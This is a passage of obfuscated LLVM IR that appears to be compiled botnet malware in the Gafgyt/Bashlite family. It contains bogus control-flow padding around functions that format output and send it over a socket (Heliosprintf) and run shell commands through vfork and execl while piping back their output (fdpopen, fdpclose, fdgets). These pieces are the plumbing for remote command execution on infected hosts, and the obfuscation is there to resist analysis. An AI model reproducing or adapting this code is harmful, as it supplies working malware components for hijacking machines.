  %gen13 = mul i32 %_12, 48
  %_14 = sub i32 %176, 48
  %gen15 = mul i32 %_14, 48
  %_16 = sub i32 0, %176
  %gen17 = add i32 %_16, 48
  %_18 = shl i32 %176, 48
  %_19 = shl i32 %176, 48
  %177 = add nsw i32 %176, 48
  %178 = trunc i32 %177 to i8
  %179 = load i8*, i8** %25, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 -1
  store i8* %180, i8** %25, align 8
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %19, align 4
  %182 = load i32, i32* %29, align 4
  %_20 = sub i32 %182, %181
  %gen21 = mul i32 %_20, %181
  %_22 = shl i32 %182, %181
  %_23 = sub i32 0, %182
  %gen24 = add i32 %_23, %181
  %183 = udiv i32 %182, %181
  store i32 %183, i32* %29, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* @x.13
  %28 = load i32, i32* @y.14
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %18
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @Heliosprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8*, i8** %5, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 119
  %27 = load i32, i32* @x.19
  %28 = load i32, i32* @y.20
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %57, label %35

; <label>:35:                                     ; preds = %originalBBpart2, %2
  %36 = load i32, i32* @x.19
  %37 = load i32, i32* @y.20
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i8*, i8** %5, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp ne i32 %47, 0
  %49 = load i32, i32* @x.19
  %50 = load i32, i32* @y.20
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %48, label %57, label %74

; <label>:57:                                     ; preds = %originalBBpart24, %originalBBpart2
  %58 = load i32, i32* @x.19
  %59 = load i32, i32* @y.20
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %57
  store i32 -1, i32* %3, align 4
  %66 = load i32, i32* @x.19
  %67 = load i32, i32* @y.20
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %285

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i32, i32* @x.19
  %76 = load i32, i32* @y.20
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %74
  %83 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %84 = call i32 @pipe(i32* %83) #2
  %85 = icmp slt i32 %84, 0
  %86 = load i32, i32* @x.19
  %87 = load i32, i32* @y.20
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %85, label %94, label %111

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* @x.19
  %96 = load i32, i32* @y.20
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %94
  store i32 -1, i32* %3, align 4
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %285

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i32*, i32** @fdopen_pids, align 8
  %113 = icmp eq i32* %112, null
  br i1 %113, label %114, label %150

; <label>:114:                                    ; preds = %111
  %115 = call i32 @getdtablesize() #2
  store i32 %115, i32* %8, align 4
  %116 = icmp sle i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %114
  store i32 -1, i32* %3, align 4
  br label %285

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* @x.19
  %120 = load i32, i32* @y.20
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %118
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = mul i64 %128, 4
  %130 = trunc i64 %129 to i32
  %131 = zext i32 %130 to i64
  %132 = call noalias i8* @malloc(i64 %131) #2
  %133 = bitcast i8* %132 to i32*
  store i32* %133, i32** @fdopen_pids, align 8
  %134 = icmp eq i32* %133, null
  %135 = load i32, i32* @x.19
  %136 = load i32, i32* @y.20
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br i1 %134, label %143, label %144

; <label>:143:                                    ; preds = %originalBBpart227
  store i32 -1, i32* %3, align 4
  br label %285

; <label>:144:                                    ; preds = %originalBBpart227
  %145 = load i32*, i32** @fdopen_pids, align 8
  %146 = bitcast i32* %145 to i8*
  %147 = load i32, i32* %8, align 4
  %148 = sext i32 %147 to i64
  %149 = mul i64 %148, 4
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 %149, i32 1, i1 false)
  br label %150

; <label>:150:                                    ; preds = %144, %111
  %151 = call i32 @vfork() #11
  store i32 %151, i32* %9, align 4
  switch i32 %151, label %245 [
    i32 -1, label %152
    i32 0, label %159
  ]

; <label>:152:                                    ; preds = %150
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @close(i32 %154)
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @close(i32 %157)
  store i32 -1, i32* %3, align 4
  br label %285

; <label>:159:                                    ; preds = %150
  %160 = load i32, i32* @x.19
  %161 = load i32, i32* @y.20
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %159
  %168 = load i8*, i8** %5, align 8
  %169 = load i8, i8* %168, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 114
  %172 = load i32, i32* @x.19
  %173 = load i32, i32* @y.20
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %171, label %180, label %227

; <label>:180:                                    ; preds = %originalBBpart231
  %181 = load i32, i32* @x.19
  %182 = load i32, i32* @y.20
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %180
  %189 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %190 = load i32, i32* %189, align 4
  %191 = icmp ne i32 %190, 1
  %192 = load i32, i32* @x.19
  %193 = load i32, i32* @y.20
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %191, label %200, label %207

; <label>:200:                                    ; preds = %originalBBpart235
  %201 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %202 = load i32, i32* %201, align 4
  %203 = call i32 @dup2(i32 %202, i32 1) #2
  %204 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %205 = load i32, i32* %204, align 4
  %206 = call i32 @close(i32 %205)
  br label %207

; <label>:207:                                    ; preds = %200, %originalBBpart235
  %208 = load i32, i32* @x.19
  %209 = load i32, i32* @y.20
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %207
  %216 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %217 = load i32, i32* %216, align 4
  %218 = call i32 @close(i32 %217)
  %219 = load i32, i32* @x.19
  %220 = load i32, i32* @y.20
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %242

; <label>:227:                                    ; preds = %originalBBpart231
  %228 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %229 = load i32, i32* %228, align 4
  %230 = icmp ne i32 %229, 0
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %227
  %232 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %233 = load i32, i32* %232, align 4
  %234 = call i32 @dup2(i32 %233, i32 0) #2
  %235 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %236 = load i32, i32* %235, align 4
  %237 = call i32 @close(i32 %236)
  br label %238

; <label>:238:                                    ; preds = %231, %227
  %239 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %240 = load i32, i32* %239, align 4
  %241 = call i32 @close(i32 %240)
  br label %242

; <label>:242:                                    ; preds = %238, %originalBBpart239
  %243 = load i8*, i8** %4, align 8
  %244 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.344, i32 0, i32 0), i8* %243, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:245:                                    ; preds = %150
  %246 = load i32, i32* @x.19
  %247 = load i32, i32* @y.20
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %245
  %254 = load i8*, i8** %5, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 114
  %258 = load i32, i32* @x.19
  %259 = load i32, i32* @y.20
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %257, label %266, label %272

; <label>:266:                                    ; preds = %originalBBpart243
  %267 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %268 = load i32, i32* %267, align 4
  store i32 %268, i32* %6, align 4
  %269 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @close(i32 %270)
  br label %278

; <label>:272:                                    ; preds = %originalBBpart243
  %273 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %274 = load i32, i32* %273, align 4
  store i32 %274, i32* %6, align 4
  %275 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %276 = load i32, i32* %275, align 4
  %277 = call i32 @close(i32 %276)
  br label %278

; <label>:278:                                    ; preds = %272, %266
  %279 = load i32, i32* %9, align 4
  %280 = load i32*, i32** @fdopen_pids, align 8
  %281 = load i32, i32* %6, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds i32, i32* %280, i64 %282
  store i32 %279, i32* %283, align 4
  %284 = load i32, i32* %6, align 4
  store i32 %284, i32* %3, align 4
  br label %285

; <label>:285:                                    ; preds = %278, %152, %143, %117, %originalBBpart216, %originalBBpart28
  %286 = load i32, i32* %3, align 4
  ret i32 %286

originalBBalteredBB:                              ; preds = %originalBB, %14
  %287 = load i8*, i8** %5, align 8
  %288 = load i8, i8* %287, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp ne i32 %289, 119
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %291 = load i8*, i8** %5, align 8
  %292 = getelementptr inbounds i8, i8* %291, i64 1
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = icmp ne i32 %294, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %57
  store i32 -1, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %74
  %296 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %297 = call i32 @pipe(i32* %296) #2
  %298 = icmp slt i32 %297, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %94
  store i32 -1, i32* %3, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %118
  %299 = load i32, i32* %8, align 4
  %300 = sext i32 %299 to i64
  %_ = shl i64 %300, 4
  %_19 = sub i64 0, %300
  %gen = add i64 %_19, 4
  %_20 = sub i64 %300, 4
  %gen21 = mul i64 %_20, 4
  %_22 = sub i64 0, %300
  %gen23 = add i64 %_22, 4
  %_24 = shl i64 %300, 4
  %301 = mul i64 %300, 4
  %302 = trunc i64 %301 to i32
  %303 = zext i32 %302 to i64
  %304 = call noalias i8* @malloc(i64 %303) #2
  %305 = bitcast i8* %304 to i32*
  store i32* %305, i32** @fdopen_pids, align 8
  %306 = icmp eq i32* %305, null
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %159
  %307 = load i8*, i8** %5, align 8
  %308 = load i8, i8* %307, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp eq i32 %309, 114
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %180
  %311 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %312 = load i32, i32* %311, align 4
  %313 = icmp ne i32 %312, 1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %207
  %314 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @close(i32 %315)
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %245
  %317 = load i8*, i8** %5, align 8
  %318 = load i8, i8* %317, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp eq i32 %319, 114
  br label %originalBB41
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = load i32, i32* @x.21
  %3 = load i32, i32* @y.22
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.__sigset_t, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %11, align 4
  %18 = load i32*, i32** @fdopen_pids, align 8
  %19 = icmp eq i32* %18, null
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %35, label %28

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %11, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %28, %originalBBpart2
  store i32 -1, i32* %10, align 4
  br label %94

; <label>:36:                                     ; preds = %28
  %37 = load i32, i32* %11, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @sigemptyset(%struct.__sigset_t* %14) #2
  %40 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 2) #2
  %41 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 3) #2
  %42 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 1) #2
  %43 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %14, %struct.__sigset_t* %13) #2
  br label %44

; <label>:44:                                     ; preds = %58, %36
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %11, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %15, i32 0)
  store i32 %50, i32* %16, align 4
  br label %51

; <label>:51:                                     ; preds = %44
  %52 = load i32, i32* %16, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %51
  %55 = call i32* @__errno_location() #13
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 4
  br label %58

; <label>:58:                                     ; preds = %54, %51
  %59 = phi i1 [ false, %51 ], [ %57, %54 ]
  br i1 %59, label %44, label %60

; <label>:60:                                     ; preds = %58
  %61 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #2
  %62 = load i32*, i32** @fdopen_pids, align 8
  %63 = load i32, i32* %12, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 0, i32* %65, align 4
  %66 = load i32, i32* %16, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %60
  br label %76

; <label>:69:                                     ; preds = %60
  %70 = bitcast %struct.in_addr* %17 to i32*
  %71 = load i32, i32* %15, align 4
  store i32 %71, i32* %70, align 4
  %72 = bitcast %struct.in_addr* %17 to i32*
  %73 = load i32, i32* %72, align 4
  %74 = and i32 %73, 65280
  %75 = ashr i32 %74, 8
  br label %76

; <label>:76:                                     ; preds = %69, %68
  %77 = phi i32 [ -1, %68 ], [ %75, %69 ]
  %78 = load i32, i32* @x.21
  %79 = load i32, i32* @y.22
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %76
  store i32 %77, i32* %10, align 4
  %86 = load i32, i32* @x.21
  %87 = load i32, i32* @y.22
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %94

; <label>:94:                                     ; preds = %originalBBpart24, %35
  %95 = load i32, i32* %10, align 4
  ret i32 %95

originalBBalteredBB:                              ; preds = %originalBB, %1
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  %98 = alloca i32, align 4
  %99 = alloca %struct.__sigset_t, align 8
  %100 = alloca %struct.__sigset_t, align 8
  %101 = alloca i32, align 4
  %102 = alloca i32, align 4
  %103 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %97, align 4
  %104 = load i32*, i32** @fdopen_pids, align 8
  %105 = icmp eq i32* %104, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %76
  store i32 %77, i32* %10, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
